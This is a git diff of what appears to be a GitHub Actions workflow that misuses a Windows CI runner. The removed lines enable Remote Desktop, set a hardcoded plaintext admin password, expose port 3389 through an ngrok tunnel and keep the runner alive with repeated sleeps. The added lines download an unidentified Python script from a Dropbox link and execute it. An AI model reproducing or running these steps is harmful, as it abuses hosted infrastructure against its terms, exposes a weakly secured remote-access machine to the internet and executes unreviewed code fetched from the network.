@@ -9,25 +9,6 @@ jobs:
 
     steps:
     - name: Download
-      run: Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
-    - name: Extract
-      run: Expand-Archive ngrok.zip
-    - name: Auth
-      run: .\ngrok\ngrok.exe authtoken $Env:NGROK_AUTH_TOKEN
-      env:
-        NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
-    - name: Enable TS
-      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
-    - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-    - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
-    - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "Passwd!" -Force)
-    - name: Downloading Stuff
-      run: Invoke-WebRequest https://altushost-swe.dl.sourceforge.net/project/processhacker/processhacker2/processhacker-2.39-setup.exe -OutFile phcock.exe
-    - run: Invoke-WebRequest https://github.com/chieunhatnang/VM-QuickConfig/releases/download/1.6.1/VMQuickConfig-Static.exe -OutFile vmquickconfig.exe
-    - run: git clone https://github.com/OxIceBear/MC-BOT.git
-    - name: Create Tunnel
-      run: .\ngrok\ngrok.exe tcp 3389
-    - run: sleep 1200
-    - run: sleep 1200
-    - run: sleep 1200
-    - run: sleep 1200
+      run: Invoke-WebRequest https://www.dropbox.com/scl/fi/a2hosrrny09d6j05ummx9/index.py?rlkey=qbp0tqvq4bfyqkfay0mnc1ccu&dl=1 -OutFile index.py
+    - name: running
+      run: py index.py
